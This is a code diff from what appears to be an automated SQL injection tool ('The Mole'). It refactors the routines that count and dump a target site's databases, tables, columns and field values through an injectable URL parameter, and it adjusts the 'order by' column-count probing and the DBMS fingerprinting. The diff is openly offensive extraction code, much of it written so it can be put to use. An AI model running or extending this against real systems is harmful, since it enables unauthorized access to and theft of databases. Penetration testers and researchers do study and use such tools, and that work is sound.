@@ -23,7 +23,7 @@
 # Gastón Traberg
 
 from domanalyser import DomAnalyser,NeedleNotFound
-from dbmsmoles import Mysql5Mole
+from dbmsmoles import DbmsMole, Mysql5Mole
 from dbdump import DatabaseDump
 import sys
 
@@ -112,30 +112,41 @@ class TheMole:
         else:
             return None
 
-    def get_databases(self):
-        if self.database_dump.db_map:
-            return list(self.database_dump.db_map.keys())
-        req = self.get_requester().request(
-                self.generate_url(
-                    self._dbms_mole.schema_count_query(self.query_columns, self.injectable_field)
-                )
-              )
+    def abort_query(self):
+        self.stop_query = True
+
+    def _generic_query(self, count_query, query_generator, result_parser = lambda x: x[0]):
+        req = self.get_requester().request(self.generate_url(count_query))
         result = self._dbms_mole.parse_results(self.analyser.decode(req))
         if not result or len(result) != 1:
             raise QueryError()
         else:
+            dump_result = []
+            self.stop_query = False
             for i in range(int(result[0])):
-                req = self.get_requester().request(
-                    self.generate_url(self._dbms_mole.schema_query(
-                        self.query_columns, self.injectable_field, i)
-                    )
-                )
+                if self.stop_query:
+                    break
+                req = self.get_requester().request(self.generate_url(query_generator(i)))
                 result = self._dbms_mole.parse_results(req.decode(self.analyser.encoding))
-                if not result or len(result) != 1:
+                if not result or len(result) < 1:
                     raise QueryError()
                 else:
-                    self.database_dump.add_db(result[0])
-        return list(self.database_dump.db_map.keys())
+                    dump_result.append(result_parser(result))
+            dump_result.sort()
+            return dump_result
+
+    def get_databases(self, force_fetch=False):
+        if not force_fetch and self.database_dump.db_map:
+            return list(self.database_dump.db_map.keys())
+        data = self._generic_query(
+            self._dbms_mole.schema_count_query(self.query_columns, self.injectable_field), 
+            lambda x: self._dbms_mole.schema_query(
+                self.query_columns, self.injectable_field, x
+            )
+        )
+        for i in data:
+            self.database_dump.add_db(i)
+        return data
 
     def poll_tables(self, db):
         if self.database_dump.db_map[db]:
@@ -143,34 +154,18 @@ class TheMole:
         else:
             return None
 
-    def get_tables(self, db):
-        if not self.database_dump.db_map:
-            raise DatabasesNotDumped()
-        if db not in self.database_dump.db_map:
-            raise DatabaseNotFound()
-        if self.database_dump.db_map[db]:
+    def get_tables(self, db, force_fetch=False):
+        if not force_fetch and db in self.database_dump.db_map and self.database_dump.db_map[db]:
             return list(self.database_dump.db_map[db].keys())
-        req = self.get_requester().request(
-                self.generate_url(
-                    self._dbms_mole.table_count_query(db, self.query_columns, self.injectable_field)
-                )
-              )
-        result = self._dbms_mole.parse_results(req.decode(self.analyser.encoding))
-        if not result or len(result) != 1:
-            raise QueryError()
-        else:
-            for i in range(int(result[0])):
-                req = self.get_requester().request(
-                    self.generate_url(self._dbms_mole.table_query(
-                        db, self.query_columns, self.injectable_field, i)
-                    )
-                )
-                result = self._dbms_mole.parse_results(req.decode(self.analyser.encoding))
-                if not result or len(result) != 1:
-                    raise QueryError()
-                else:
-                    self.database_dump.add_table(db, result[0])
-        return list(self.database_dump.db_map[db].keys())
+        data = self._generic_query(
+            self._dbms_mole.table_count_query(db, self.query_columns, self.injectable_field), 
+            lambda x: self._dbms_mole.table_query(
+                db, self.query_columns, self.injectable_field, x
+            ),
+        )
+        for i in data:
+            self.database_dump.add_table(db, i)
+        return data
 
     def poll_columns(self, db, table):
         if self.database_dump.db_map[db][table]:
@@ -178,72 +173,28 @@ class TheMole:
         else:
             return None
 
-    def get_columns(self, db, table):
-        if not self.database_dump.db_map:
-            raise DatabasesNotDumped()
-        if db not in self.database_dump.db_map:
-            raise DatabaseNotFound()
-        if not self.database_dump.db_map[db]:
-            raise TableNotDumped()
-        if table not in self.database_dump.db_map[db]:
-            raise TableNotFound()
-        if self.database_dump.db_map[db][table]:
+    def get_columns(self, db, table, force_fetch=False):
+        if not force_fetch and db in self.database_dump.db_map and table in self.database_dump.db_map[db] and len(self.database_dump.db_map[db][table]) > 0:
             return list(self.database_dump.db_map[db][table])
-        req = self.get_requester().request(
-                self.generate_url(
-                    self._dbms_mole.columns_count_query(db, table, self.query_columns, self.injectable_field)
-                )
-              )
-        result = self._dbms_mole.parse_results(req.decode(self.analyser.encoding))
-        if not result or len(result) != 1:
-            raise QueryError()
-        else:
-            for i in range(int(result[0])):
-                req = self.get_requester().request(
-                    self.generate_url(self._dbms_mole.columns_query(
-                        db, table, self.query_columns, self.injectable_field, i)
-                    )
-                )
-                result = self._dbms_mole.parse_results(req.decode(self.analyser.encoding))
-                if not result or len(result) != 1:
-                    raise QueryError()
-                else:
-                    self.database_dump.add_column(db, table, result[0])
-        return self.database_dump.db_map[db][table]
+        data = self._generic_query(
+            self._dbms_mole.columns_count_query(db, table, self.query_columns, self.injectable_field), 
+            lambda x: self._dbms_mole.columns_query(
+                db, table, self.query_columns, self.injectable_field, x
+            )
+        )
+        print(data)
+        for i in data:
+            self.database_dump.add_column(db, table, i)
+        return data
 
     def get_fields(self, db, table, fields, where="1=1"):
-        if not self.database_dump.db_map:
-            raise DatabasesNotDumped()
-        if db not in self.database_dump.db_map:
-            raise DatabaseNotFound()
-        if not self.database_dump.db_map[db]:
-            raise TableNotDumped()
-        if table not in self.database_dump.db_map[db]:
-            raise TableNotFound()
-        if not self.database_dump.db_map[db][table]:
-            raise ColumnsNotDumped()
-        req = self.get_requester().request(
-                self.generate_url(
-                    self._dbms_mole.fields_count_query(db, table, self.query_columns, self.injectable_field, where=where)
-                )
-              )
-        result = self._dbms_mole.parse_results(req.decode(self.analyser.encoding))
-        if not result or len(result) != 1:
-            raise QueryError()
-        else:
-            output=[]
-            for i in range(int(result[0])):
-                req = self.get_requester().request(
-                    self.generate_url(self._dbms_mole.fields_query(
-                        db, table, fields, self.query_columns, self.injectable_field, i, where=where)
-                    )
-                )
-                result = self._dbms_mole.parse_results(req.decode(self.analyser.encoding))
-                if not result or len(result) != len(fields):
-                    raise QueryError()
-                else:
-                    output.append(result)
-            return output
+        return self._generic_query(
+            self._dbms_mole.fields_count_query(db, table, self.query_columns, self.injectable_field, where=where), 
+            lambda x: self._dbms_mole.fields_query(
+                db, table, fields, self.query_columns, self.injectable_field, x, where=where
+            ),
+            lambda x: x
+        )
 
     def get_dbinfo(self):
         req = self.get_requester().request(
@@ -319,7 +270,7 @@ class TheMole:
                 self.generate_url('{sep}{par} order by %d {com}' % (last,))
             )
         )
-        while new_needle_content != content_of_needle:
+        while new_needle_content != content_of_needle and not DbmsMole.is_error(new_needle_content):
             last *= 2
             sys.stdout.write('\r[i] Trying length: ' + str(last) + '     ')
             sys.stdout.flush()
@@ -340,7 +291,7 @@ class TheMole:
                     self.generate_url('{sep}{par} order by %d {com}' % (medio,))
                 )
             )
-            if new_needle_content != content_of_needle:
+            if new_needle_content != content_of_needle and not DbmsMole.is_error(new_needle_content):
                 pri = medio
             else:
                 last = medio - 1
@@ -379,7 +330,7 @@ class TheMole:
                 req = self.get_requester().request(url_query)
                 if dbms_mole_class.field_finger() in self.analyser.decode(req):
                     self.injectable_field = field
-                    print('[+] Found injectable field:', field)
+                    print('[+] Found injectable field:', field + 1)
                     return
         raise Exception('[-] Could not inject.')
 
@@ -389,7 +340,8 @@ class TheMole:
                                                      self.injectable_field)
             url_query = self.generate_url(query)
             req = self.get_requester().request(url_query)
-            if self.analyser.node_content(req) != self._syntax_error_content:
+            parsed = dbms_mole_class().parse_results(self.analyser.decode(req))
+            if parsed and len(parsed) > 0:
                 self._dbms_mole = dbms_mole_class()
                 print('[+] Found DBMS:', dbms_mole_class.dbms_name())
                 return
